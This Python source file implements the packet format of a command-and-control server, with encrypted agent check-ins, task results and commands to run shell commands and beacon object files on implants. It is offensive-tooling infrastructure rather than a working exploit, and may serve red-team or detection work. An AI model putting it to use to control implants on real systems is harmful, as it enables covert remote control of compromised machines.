"""
package.py — Wire‑format package layer for the Python C2 server.
Mirrors the C implementation in package.h / package.c.
"""

import struct
import hashlib
from os import urandom

from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.exceptions import InvalidTag

# ---------------------------------------------------------------------------
# Constants (from package.h)
# ---------------------------------------------------------------------------
PACKAGE_MAGIC            = 0xDEADBEEF
PACKAGE_PROTOCOL_VERSION = 1
PACKAGE_HEADER_SIZE      = 24

# Flag bits
PKG_FLAG_ENCRYPTED  = 0x0001
PKG_FLAG_BATCH      = 0x0002
PKG_FLAG_ERROR      = 0x0004
PKG_FLAG_FRAGMENT   = 0x0008
PKG_FLAG_KEYEXCHANGE = 0x0010

# Command IDs
PKG_CMD_INITIALIZE       = 0x0001
PKG_CMD_CHECKIN          = 0x0002
PKG_CMD_EXIT             = 0x0003
PKG_CMD_TASK_OUTPUT      = 0x0101
PKG_CMD_TASK_BATCH       = 0x0105
PKG_CMD_TASK_ERROR       = 0x0102
PKG_CMD_TASK_COMPLETE    = 0x0103
PKG_CMD_TASK_DROPPED     = 0x0104
PKG_CMD_EXEC_SHELL       = 0x0110   
PKG_CMD_BOF_EXECUTE      = 0x0400
PKG_CMD_BOF_OUTPUT       = 0x0401

# Agent ID hash (djb2) – fills the 4‑byte agent_id field
def agent_id_hash(s: str) -> int:
    h = 5381
    for ch in s:
        h = ((h << 5) + h) + ord(ch)
        h &= 0xFFFFFFFF
    return h

# ---------------------------------------------------------------------------
# Big‑endian pack/unpack helpers
# ---------------------------------------------------------------------------
_BE_U32 = struct.Struct('>I')
_BE_U64 = struct.Struct('>Q')
_BE_U16 = struct.Struct('>H')

def _encrypt_payload(key: bytes, plain: bytes) -> bytes:
    if not key:
        raise ValueError("Encryption requires a key")
    nonce = urandom(12)
    ct = AESGCM(key).encrypt(nonce, plain, None)
    return nonce + ct

def _decrypt_payload(key: bytes, data: bytes) -> bytes | None:
    if not data:
        return b""
    if len(data) < 28:          # 12 nonce + 0 ct + 16 tag minimum
        return b""
    nonce, ct_tag = data[:12], data[12:]
    try:
        return AESGCM(key).decrypt(nonce, ct_tag, None)
    except InvalidTag:
        return None             # explicit failure — distinguishable from b""

# ---------------------------------------------------------------------------
# PackageBuilder – constructs a single wire‑format package
# ---------------------------------------------------------------------------
class PackageBuilder:
    """Build a package in memory, then call .finalize(key) to get the wire bytes."""

    def __init__(self, command: int, request_id: int = 0,
                 encrypt: bool = True, agent_id: str = ""):
        self.command    = command
        self.request_id = request_id
        self.encrypt    = encrypt
        self.agent_id   = agent_id        # full UUID string
        self._payload   = bytearray()

    # ---- field appenders ----
    def add_int32(self, value: int):
        self._payload += _BE_U32.pack(value & 0xFFFFFFFF)

    def add_int64(self, value: int):
        self._payload += _BE_U64.pack(value & 0xFFFFFFFFFFFFFFFF)

    def add_bool(self, value: bool):
        self.add_int32(1 if value else 0)

    def add_ptr(self, value: int):      # stored as uint64
        self.add_int64(value)

    def add_bytes(self, data: bytes):
        self.add_int32(len(data))
        self._payload += data

    def add_string(self, s: str):
        """ANSI string, null‑terminated (length includes null)."""
        b = (s.encode('utf-8') + b'\x00') if s else b'\x00'
        self.add_bytes(b)

    def add_wstring(self, s: str):
        """UTF‑16LE string, null‑terminated (length includes null)."""
        if s:
            b = (s + '\x00').encode('utf-16-le')
        else:
            b = b'\x00\x00'
        self.add_bytes(b)

    def add_pad(self, data: bytes):
        """Raw bytes – no length prefix."""
        self._payload += data

    # ---- final assembly ----
    def finalize(self, session_key: bytes = b"") -> bytes:
        """Return complete wire‑format bytes: header + payload (optionally encrypted)."""
        flags = 0
        if self.encrypt:
            flags |= PKG_FLAG_ENCRYPTED

        payload = bytes(self._payload)
        if self.encrypt and session_key:
            payload = _encrypt_payload(session_key, payload)

        agent_hash = agent_id_hash(self.agent_id) if self.agent_id else 0

        # length = (header size + payload size) - 4 (because length field excludes itself)
        total_len = PACKAGE_HEADER_SIZE + len(payload) - 4
        header = bytearray(PACKAGE_HEADER_SIZE)
        _BE_U32.pack_into(header, 0,  total_len)
        _BE_U32.pack_into(header, 4,  PACKAGE_MAGIC)
        _BE_U16.pack_into(header, 8,  PACKAGE_PROTOCOL_VERSION)
        _BE_U16.pack_into(header, 10, flags)
        _BE_U32.pack_into(header, 12, agent_hash)
        _BE_U32.pack_into(header, 16, self.command)
        _BE_U32.pack_into(header, 20, self.request_id)

        return bytes(header) + payload

# ---------------------------------------------------------------------------
# PackageReader – parses a received package
# ---------------------------------------------------------------------------
class PackageReader:
    """Reads fields sequentially from a received package (decrypts if needed)."""

    def __init__(self, data: bytes, session_key: bytes = b""):
        if len(data) < PACKAGE_HEADER_SIZE:
            raise ValueError("Data too short for package header")

        # Parse header
        self.length      = _BE_U32.unpack(data[0:4])[0]
        self.magic       = _BE_U32.unpack(data[4:8])[0]
        self.version     = _BE_U16.unpack(data[8:10])[0]
        self.flags       = _BE_U16.unpack(data[10:12])[0]
        self.agent_hash  = _BE_U32.unpack(data[12:16])[0]
        self.command     = _BE_U32.unpack(data[16:20])[0]
        self.request_id  = _BE_U32.unpack(data[20:24])[0]

        # Extract payload
        payload_start = PACKAGE_HEADER_SIZE
        self._raw_payload = data[payload_start:]

        if self.flags & PKG_FLAG_ENCRYPTED:
            if not session_key:
                raise ValueError("Encrypted payload but no session key")
            self._payload = _decrypt_payload(session_key, self._raw_payload)
            if self._payload is None:   # None = decryption failed, b"" = valid empty payload
                raise ValueError("Failed to decrypt or verify payload")
        else:
            self._payload = self._raw_payload

        self._offset = 0

    @property
    def payload(self) -> bytes:
        return self._payload

    def _check(self, size: int):
        if self._offset + size > len(self._payload):
            raise IndexError(f"Payload underflow: need {size} bytes, "
                             f"only {len(self._payload) - self._offset} left")

    def _read(self, size: int) -> bytes:
        self._check(size)
        buf = self._payload[self._offset:self._offset + size]
        self._offset += size
        return buf

    # ---- typed readers ----
    def read_int32(self) -> int:
        return _BE_U32.unpack(self._read(4))[0]

    def read_int64(self) -> int:
        return _BE_U64.unpack(self._read(8))[0]

    def read_bool(self) -> bool:
        return self.read_int32() != 0

    def read_bytes(self) -> bytes:
        length = self.read_int32()
        return self._read(length)

    def read_string(self) -> str:
        b = self.read_bytes()
        if b.endswith(b'\x00'):
            b = b[:-1]
        return b.decode('utf-8', errors='replace')

    def read_wstring(self) -> str:
        b = self.read_bytes()
        if b.endswith(b'\x00\x00'):
            b = b[:-2]
        return b.decode('utf-16-le', errors='replace')

# ---------------------------------------------------------------------------
# Batch helpers
# ---------------------------------------------------------------------------
def parse_batch(batch_payload: bytes, session_key: bytes = b"") -> list:
    """
    Parse a batch payload (the decrypted body of a PKG_FLAG_BATCH package)
    and return a list of PackageReader objects, one per sub‑package.

    session_key is only used if sub‑packages have PKG_FLAG_ENCRYPTED set,
    which is not the default (the batch itself is encrypted, not its children).
    """
    readers = []
    offset = 0
    while offset + PACKAGE_HEADER_SIZE <= len(batch_payload):
        sub_len_field = _BE_U32.unpack(batch_payload[offset:offset + 4])[0]
        total_sub_len = sub_len_field + 4
        if offset + total_sub_len > len(batch_payload):
            break
        sub_data = batch_payload[offset:offset + total_sub_len]
        offset += total_sub_len
        try:
            readers.append(PackageReader(sub_data, session_key))
        except ValueError:
            continue
    return readers

def build_batch(top_command: int, sub_packages: list,
                session_key: bytes, agent_id: str = "") -> bytes:
    """
    Create a batch package (top‑level command `top_command`, PKG_FLAG_BATCH set)
    containing the wire bytes of all `sub_packages` (PackageBuilder instances).
    The sub‑packages are serialized plaintext; the outer package encrypts everything.
    """
    # Concatenate sub‑packages as plaintext wire buffers
    payload = bytearray()
    for sub in sub_packages:
        # Force sub‑packages to be plaintext; the batch itself provides encryption
        saved_encrypt = sub.encrypt
        sub.encrypt = False
        payload += sub.finalize(b"")   # empty key, encrypt=False → no encryption
        sub.encrypt = saved_encrypt

    # Build the batch envelope manually (we need BATCH flag + ENCRYPTED)
    flags = PKG_FLAG_ENCRYPTED | PKG_FLAG_BATCH
    agent_hash = agent_id_hash(agent_id) if agent_id else 0

    encrypted_payload = _encrypt_payload(session_key, bytes(payload))

    total_len = PACKAGE_HEADER_SIZE + len(encrypted_payload) - 4
    header = bytearray(PACKAGE_HEADER_SIZE)
    _BE_U32.pack_into(header, 0,  total_len)
    _BE_U32.pack_into(header, 4,  PACKAGE_MAGIC)
    _BE_U16.pack_into(header, 8,  PACKAGE_PROTOCOL_VERSION)
    _BE_U16.pack_into(header, 10, flags)
    _BE_U32.pack_into(header, 12, agent_hash)
    _BE_U32.pack_into(header, 16, top_command)
    _BE_U32.pack_into(header, 20, 0)   # request_id always 0 for batch container

    return bytes(header) + encrypted_payload